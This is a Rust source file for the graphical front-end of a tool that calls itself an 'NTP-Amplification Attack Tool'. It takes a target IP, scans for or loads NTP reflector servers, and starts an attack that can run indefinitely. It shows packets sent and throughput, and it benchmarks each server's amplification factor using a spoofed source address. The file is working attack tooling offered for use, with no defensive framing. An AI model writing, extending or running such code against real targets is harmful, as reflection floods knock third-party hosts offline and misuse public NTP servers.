// Author: dotslashCosmic

use eframe::{egui, App, Frame};
use egui::{CentralPanel, Context, Layout, RichText, ScrollArea, TextEdit, Vec2};
use colored::Color;
use std::sync::Mutex;
use std::time::{Instant, Duration};
use chrono::Duration as ChronoDuration;

use crossbeam_channel as cb_mpsc;
use tokio::sync::mpsc as tokio_mpsc;


use crate::{AppCommand, AttackStats, is_ipv4, is_ipv6, print_formatted_to_channel, BenchmarkResult, DEFAULT_SERVERS_LIST_PATH};

static LOG_SENDER: once_cell::sync::OnceCell<cb_mpsc::Sender<(String, Color)>> = once_cell::sync::OnceCell::new();
static COMMAND_SENDER: once_cell::sync::OnceCell<tokio_mpsc::UnboundedSender<AppCommand>> = once_cell::sync::OnceCell::new();
static STATS_SENDER_TO_GUI: once_cell::sync::OnceCell<tokio_mpsc::UnboundedSender<AttackStats>> = once_cell::sync::OnceCell::new();
static SCANNED_SERVERS_SENDER_TO_GUI: once_cell::sync::OnceCell<tokio_mpsc::UnboundedSender<Vec<String>>> = once_cell::sync::OnceCell::new();
static SERVER_LIST_PATH_SENDER_TO_GUI: once_cell::sync::OnceCell<tokio_mpsc::UnboundedSender<String>> = once_cell::sync::OnceCell::new();
static CONFIG_PATH_SENDER_TO_GUI: once_cell::sync::OnceCell<tokio_mpsc::UnboundedSender<String>> = once_cell::sync::OnceCell::new();
static BENCHMARK_RESULT_SENDER_TO_GUI: once_cell::sync::OnceCell<tokio_mpsc::UnboundedSender<BenchmarkResult>> = once_cell::sync::OnceCell::new();

pub fn init_channels(
    log_tx: cb_mpsc::Sender<(String, Color)>,
    command_tx: tokio_mpsc::UnboundedSender<AppCommand>,
    stats_tx_to_gui: tokio_mpsc::UnboundedSender<AttackStats>,
    scanned_servers_tx_to_gui: tokio_mpsc::UnboundedSender<Vec<String>>,
    server_list_path_tx_to_gui: tokio_mpsc::UnboundedSender<String>,
    config_path_tx_to_gui: tokio_mpsc::UnboundedSender<String>,
    benchmark_result_tx_to_gui: tokio_mpsc::UnboundedSender<BenchmarkResult>,
) {
    LOG_SENDER.set(log_tx).expect("Failed to set LOG_SENDER");
    COMMAND_SENDER.set(command_tx).expect("Failed to set COMMAND_SENDER");
    STATS_SENDER_TO_GUI.set(stats_tx_to_gui).expect("Failed to set STATS_SENDER_TO_GUI");
    SCANNED_SERVERS_SENDER_TO_GUI.set(scanned_servers_tx_to_gui).expect("Failed to set SCANNED_SERVERS_SENDER_TO_GUI");
    SERVER_LIST_PATH_SENDER_TO_GUI.set(server_list_path_tx_to_gui).expect("Failed to set SERVER_LIST_PATH_SENDER_TO_GUI");
    CONFIG_PATH_SENDER_TO_GUI.set(config_path_tx_to_gui).expect("Failed to set CONFIG_PATH_SENDER_TO_GUI");
    BENCHMARK_RESULT_SENDER_TO_GUI.set(benchmark_result_tx_to_gui).expect("Failed to set BENCHMARK_RESULT_SENDER_TO_GUI");
}

pub fn log_sender() -> &'static cb_mpsc::Sender<(String, Color)> {
    LOG_SENDER.get().expect("Log sender not initialized")
}
pub fn command_sender() -> &'static tokio_mpsc::UnboundedSender<AppCommand> {
    COMMAND_SENDER.get().expect("Command sender not initialized")
}

pub fn _stats_sender_to_gui() -> &'static tokio_mpsc::UnboundedSender<AttackStats> {
    STATS_SENDER_TO_GUI.get().expect("Stats sender to GUI not initialized")
}
pub fn _scanned_servers_sender_to_gui() -> &'static tokio_mpsc::UnboundedSender<Vec<String>> {
    SCANNED_SERVERS_SENDER_TO_GUI.get().expect("Scanned servers sender to GUI not initialized")
}
pub fn server_list_path_sender_to_gui() -> &'static tokio_mpsc::UnboundedSender<String> {
    SERVER_LIST_PATH_SENDER_TO_GUI.get().expect("Server list path sender to GUI not initialized")
}
pub fn config_path_sender_to_gui() -> &'static tokio_mpsc::UnboundedSender<String> {
    CONFIG_PATH_SENDER_TO_GUI.get().expect("Config path sender to GUI not initialized")
}
pub fn _benchmark_result_sender_to_gui() -> &'static tokio_mpsc::UnboundedSender<BenchmarkResult> {
    BENCHMARK_RESULT_SENDER_TO_GUI.get().expect("Benchmark result sender to GUI not initialized")
}

static CONFIG_PATH_STATE: Mutex<String> = Mutex::new(String::new());
pub fn get_config_path() -> String {
    CONFIG_PATH_STATE.lock().unwrap().clone()
}
pub fn set_config_path(path: String) {
    *CONFIG_PATH_STATE.lock().unwrap() = path;
}

fn map_color_to_egui_color32(color: &Color) -> egui::Color32 {
    match color {
        Color::Black => egui::Color32::BLACK,
        Color::Red => egui::Color32::RED,
        Color::Green => egui::Color32::GREEN,
        Color::Yellow => egui::Color32::YELLOW,
        Color::Blue => egui::Color32::BLUE,
        Color::Magenta => egui::Color32::LIGHT_BLUE,
        Color::Cyan => egui::Color32::from_rgb(0, 255, 255),
        Color::White => egui::Color32::WHITE,
        _ => egui::Color32::GRAY,
    }
}


pub struct NTPAmplifierApp {
    target_ip: String,
    server_list_path: String,
    config_path: String,
    log_messages: Vec<(String, Color)>,
    is_attacking: bool,
    is_scanning: bool,
    _attack_start_time: Option<Instant>,
    packets_sent: u64,
    attack_duration_secs: u64,
    scanned_servers: Vec<String>,

    log_rx: cb_mpsc::Receiver<(String, Color)>,
    _command_tx_clone: tokio_mpsc::UnboundedSender<AppCommand>, 
    stats_rx: tokio_mpsc::UnboundedReceiver<AttackStats>,
    scanned_servers_rx: tokio_mpsc::UnboundedReceiver<Vec<String>>,
    server_list_path_rx_from_browse: tokio_mpsc::UnboundedReceiver<String>,
    config_path_rx_from_browse: tokio_mpsc::UnboundedReceiver<String>,

    benchmark_server_ip: String,
    benchmark_spoofed_source_ip: String,
    last_benchmark_result: Option<BenchmarkResult>,
    is_benchmarking: bool,
    benchmark_result_rx: tokio_mpsc::UnboundedReceiver<BenchmarkResult>,
}

impl NTPAmplifierApp {
    pub fn new(
        cc: &eframe::CreationContext<'_>,
        log_rx: cb_mpsc::Receiver<(String, Color)>,
        stats_rx: tokio_mpsc::UnboundedReceiver<AttackStats>,
        scanned_servers_rx: tokio_mpsc::UnboundedReceiver<Vec<String>>,
        server_list_path_rx_from_browse: tokio_mpsc::UnboundedReceiver<String>,
        config_path_rx_from_browse: tokio_mpsc::UnboundedReceiver<String>,
        benchmark_result_rx: tokio_mpsc::UnboundedReceiver<BenchmarkResult>,
    ) -> Self {
        cc.egui_ctx.set_visuals(egui::Visuals::dark());

        let initial_config_path = "config.json".to_string();
        set_config_path(initial_config_path.clone());

        Self {
            target_ip: "127.0.0.1".to_string(),
            server_list_path: crate::DEFAULT_SERVERS_LIST_PATH.to_string(),
            config_path: initial_config_path,
            log_messages: Vec::new(),
            is_attacking: false,
            is_scanning: false,
            _attack_start_time: None,
            packets_sent: 0,
            attack_duration_secs: 0,
            scanned_servers: Vec::new(),
            log_rx,
            _command_tx_clone: command_sender().clone(),
            stats_rx,
            scanned_servers_rx,
            server_list_path_rx_from_browse,
            config_path_rx_from_browse,
            benchmark_server_ip: "north-america.pool.ntp.org".to_string(),
            benchmark_spoofed_source_ip: "127.0.0.1".to_string(),
            last_benchmark_result: None,
            is_benchmarking: false,
            benchmark_result_rx,
        }
    }

    fn update_logs(&mut self) {
        while let Ok((msg_text, original_color)) = self.log_rx.try_recv() {
            self.log_messages.push((msg_text, original_color));
        }
    }

    fn update_stats(&mut self) {
        while let Ok(stats) = self.stats_rx.try_recv() {
            self.packets_sent = stats.packets_sent;
            self.attack_duration_secs = stats.duration_secs;
        }
    }
    
    fn update_scanned_servers(&mut self) {
        while let Ok(servers) = self.scanned_servers_rx.try_recv() {
            self.is_scanning = false;
            self.scanned_servers = servers;
            print_formatted_to_channel(log_sender().clone(), "+", &format!("Scan complete. Found {} servers.", self.scanned_servers.len()), Color::Green);
            for server in &self.scanned_servers {
                 print_formatted_to_channel(log_sender().clone(), "+", &format!("  - {}", server), Color::Green);
            }
        }
    }

    fn update_file_paths(&mut self) {
        if let Ok(new_path) = self.server_list_path_rx_from_browse.try_recv() {
            self.server_list_path = new_path;
        }
        if let Ok(new_path) = self.config_path_rx_from_browse.try_recv() {
            self.config_path = new_path.clone();
            set_config_path(new_path);
        }
    }


    fn update_benchmark_results(&mut self) {
        while let Ok(result) = self.benchmark_result_rx.try_recv() {
            self.last_benchmark_result = Some(result);
            self.is_benchmarking = false;
        }
    }
}

impl App for NTPAmplifierApp {
    fn update(&mut self, ctx: &Context, _frame: &mut Frame) {
        self.update_logs();
        self.update_stats();
        self.update_scanned_servers();
        self.update_file_paths();
        self.update_benchmark_results();

        CentralPanel::default().show(ctx, |ui| {
            ui.heading(RichText::new("NTP AMPLIFIER by dotslashCosmic").color(egui::Color32::RED).strong().size(30.0));
            ui.label(RichText::new(format!("IPv4/6 NTP-Amplification Attack Tool v{}", crate::VERSION)).color(egui::Color32::RED).strong().underline());
            ui.add_space(10.0);
            ui.group(|ui| {
                ui.vertical(|ui| {
                    ui.add_space(5.0);
                    ui.label("Target IP:");
                    ui.add(TextEdit::singleline(&mut self.target_ip).min_size(Vec2::new(200.0, 20.0)).hint_text("e.g., 192.168.1.1 or 2001:db8::1"));
                    if !self.target_ip.is_empty() && !is_ipv4(&self.target_ip) && !is_ipv6(&self.target_ip) {
                        ui.label(RichText::new("Invalid IP address format").color(egui::Color32::RED));
                    }
                    ui.add_space(10.0);
                    ui.horizontal(|ui| {
                        ui.label("Server List File:");
                        ui.add(TextEdit::singleline(&mut self.server_list_path).min_size(Vec2::new(300.0, 20.0)));
                        if ui.button("Browse...").clicked() {
                            let _ = command_sender().send(AppCommand::BrowseServerList);
                        }
                    });
                    ui.add_space(5.0);
                    ui.horizontal(|ui| {
                        ui.label("NTP Config File:");
                        ui.add(TextEdit::singleline(&mut self.config_path).min_size(Vec2::new(300.0, 20.0)));
                        if ui.button("Browse...").clicked() {
                            let _ = command_sender().send(AppCommand::BrowseConfig);
                        }
                    });
                    ui.add_space(10.0);
                    ui.horizontal(|ui| {
                        if ui.add_enabled(!self.is_scanning && !self.is_attacking, egui::Button::new("Scan Servers")).clicked() {
                            self.is_scanning = true;
                            self.scanned_servers.clear();
                            let _ = command_sender().send(AppCommand::ScanServers);
                        }
                        if self.is_scanning {
                            ui.spinner();
                            ui.label("Scanning...");
                        } else if !self.scanned_servers.is_empty() && !self.is_attacking {
                            ui.label(format!("Using {} scanned NTP servers.", self.scanned_servers.len()));
                        } else if self.scanned_servers.is_empty() && !self.is_attacking {
                             ui.label("No servers scanned. Use scan or provide a server list.");
                        }
                    });
                    ui.add_space(10.0);
                });
            });

            ui.add_space(20.0);
            ui.with_layout(Layout::top_down(egui::Align::Center), |ui| {
                let button_text = if self.is_attacking {
                    RichText::new("STOP ATTACK").color(egui::Color32::WHITE).strong().size(24.0)
                } else {
                    RichText::new("START ATTACK").color(egui::Color32::WHITE).strong().size(24.0)
                };
                let button_color = if self.is_attacking {
                    egui::Color32::RED
                } else {
                    egui::Color32::from_rgb(0, 150, 0)
                };

                if ui.add(egui::Button::new(button_text).fill(button_color).min_size(Vec2::new(200.0, 50.0))).clicked() {
                    if self.is_attacking {
                        self.is_attacking = false;
                        let _ = command_sender().send(AppCommand::StopAttack);
                    } else {
                        if self.target_ip.is_empty() || (!is_ipv4(&self.target_ip) && !is_ipv6(&self.target_ip)) {
                            print_formatted_to_channel(log_sender().clone(), "!", "Please enter a valid Target IP.", Color::Yellow);
                        } else {
                            let servers_to_use = if !self.scanned_servers.is_empty() {
                                self.scanned_servers.clone()
                            } else if !self.server_list_path.is_empty() {
                                match crate::read_servers(&self.server_list_path) {
                                    Ok(file_servers) if !file_servers.is_empty() => {
                                        print_formatted_to_channel(log_sender().clone(), "+", &format!("Using {} servers from {}", file_servers.len(), self.server_list_path), Color::Green);
                                        file_servers
                                    }
                                    Ok(_) => {
                                        print_formatted_to_channel(log_sender().clone(), "!", &format!("Server list file '{}' is empty or contains no valid servers.", self.server_list_path), Color::Yellow);
                                        Vec::new()
                                    }
                                    Err(e) => {
                                        print_formatted_to_channel(log_sender().clone(), "-", &format!("Error reading server list file '{}': {}", self.server_list_path, e), Color::Red);
                                        Vec::new()
                                    }
                                }
                            } else {
                                Vec::new()
                            };

                            if servers_to_use.is_empty() {
                                print_formatted_to_channel(log_sender().clone(), "!", "No NTP servers available. Scan or provide a server list file.", Color::Yellow);
                            } else {
                                self.is_attacking = true;
                                self._attack_start_time = Some(Instant::now());
                                self.packets_sent = 0;
                                self.attack_duration_secs = 0;
                                self.scanned_servers = servers_to_use.clone();

                                let _ = command_sender().send(AppCommand::StartAttack {
                                    target_ip: self.target_ip.clone(),
                                    servers: servers_to_use,
                                    duration_secs: 0, // 0 for indefinite, or user set
                                });
                            }
                        }
                    }
                }
            });

            ui.add_space(20.0);
            ui.group(|ui| {
                ui.vertical(|ui| {
                    ui.heading("NTP Server Benchmark:");
                    ui.add_space(5.0);
                    ui.horizontal(|ui| {
                        ui.label("Server IP to Benchmark:");
                        ui.add(TextEdit::singleline(&mut self.benchmark_server_ip).min_size(Vec2::new(200.0, 20.0)).hint_text("e.g., time.google.com or IP"));
                        if !self.benchmark_server_ip.is_empty() && !(is_ipv4(&self.benchmark_server_ip) || is_ipv6(&self.benchmark_server_ip) || self.benchmark_server_ip.contains('.')) {
                            ui.label(RichText::new("Invalid IP/Hostname format").color(egui::Color32::RED));
                        }
                    });
                    ui.add_space(5.0);
                    ui.horizontal(|ui| {
                        ui.label("Test Target IP (Spoofed Source):");
                        ui.add(TextEdit::singleline(&mut self.benchmark_spoofed_source_ip).min_size(Vec2::new(200.0, 20.0)).hint_text("e.g., a local IP you can listen on"));
                        if !self.benchmark_spoofed_source_ip.is_empty() && !is_ipv4(&self.benchmark_spoofed_source_ip) && !is_ipv6(&self.benchmark_spoofed_source_ip) {
                            ui.label(RichText::new("Invalid IP format for Test Target").color(egui::Color32::RED));
                        }
                    });
                    ui.add_space(10.0);
                    ui.horizontal(|ui| {
                        if ui.add_enabled(!self.is_benchmarking, egui::Button::new("Benchmark Server")).clicked() {
                            if self.benchmark_server_ip.is_empty() {
                                print_formatted_to_channel(log_sender().clone(), "!", "Please enter a Server IP/Hostname for benchmarking.", Color::Yellow);
                            } else if self.benchmark_spoofed_source_ip.is_empty() || (!is_ipv4(&self.benchmark_spoofed_source_ip) && !is_ipv6(&self.benchmark_spoofed_source_ip)) {
                                print_formatted_to_channel(log_sender().clone(), "!", "Please enter a valid Test Target IP for benchmarking (must be a local IP).", Color::Yellow);
                            } else {
                                self.is_benchmarking = true;
                                self.last_benchmark_result = None;
                                let _ = command_sender().send(AppCommand::BenchmarkServer {
                                    server_ip: self.benchmark_server_ip.clone(),
                                    spoofed_source_ip: self.benchmark_spoofed_source_ip.clone(),
                                });
                            }
                        }
                        if self.is_benchmarking {
                            ui.spinner();
                            ui.label("Benchmarking...");
                        }
                    });
                    ui.add_space(10.0);
                    if let Some(result) = &self.last_benchmark_result {
                        ui.label(RichText::new("Last Benchmark Result:").strong());
                        ui.label(format!("Server: {}", result.server_ip));
                        ui.label(format!("Bytes Received: {}", result.bytes_received));
                        ui.label(format!("Amplification Factor: {:.2}x", result.amplification_factor));
                    }
                });
            });

            ui.add_space(20.0);
            ui.group(|ui| {
                ui.vertical(|ui| {
                    ui.heading("Attack Statistics:");
                    ui.add_space(5.0);
                    ui.horizontal(|ui| {
                        ui.label(RichText::new("Attack Duration:").strong());
                        let duration_chrono = ChronoDuration::seconds(self.attack_duration_secs as i64);
                        let hours = duration_chrono.num_hours();
                        let minutes = duration_chrono.num_minutes() % 60;
                        let seconds = duration_chrono.num_seconds() % 60;
                        ui.label(format!("{:02}:{:02}:{:02}", hours, minutes, seconds));
                    });
                    ui.horizontal(|ui| {
                        ui.label(RichText::new("Packets Sent:").strong());
                        ui.label(format!("{}", self.packets_sent));
                    });
                    ui.horizontal(|ui| {
                        ui.label(RichText::new("Effective Throughput:").strong());
                        if self.attack_duration_secs > 0 {
                            ui.label(format!("{:.2} PPS", self.packets_sent as f64 / self.attack_duration_secs as f64));
                        } else {
                            ui.label("0.00 PPS");
                        }
                    });
                    ui.horizontal(|ui| {
                        ui.label(RichText::new("Active Servers:").strong());
                        ui.label(format!("{}", self.scanned_servers.len()));
                    });
                });
            });

            ui.add_space(20.0);
            ui.heading("Logs:");
            ui.add_space(5.0);
            ScrollArea::vertical().max_height(200.0).stick_to_bottom(true).show(ui, |ui| {
                for (msg, color_enum_val) in &self.log_messages {
                    ui.label(RichText::new(msg).color(map_color_to_egui_color32(color_enum_val)));
                }
            });
        });

        ctx.request_repaint_after(Duration::from_millis(100));
    }
}
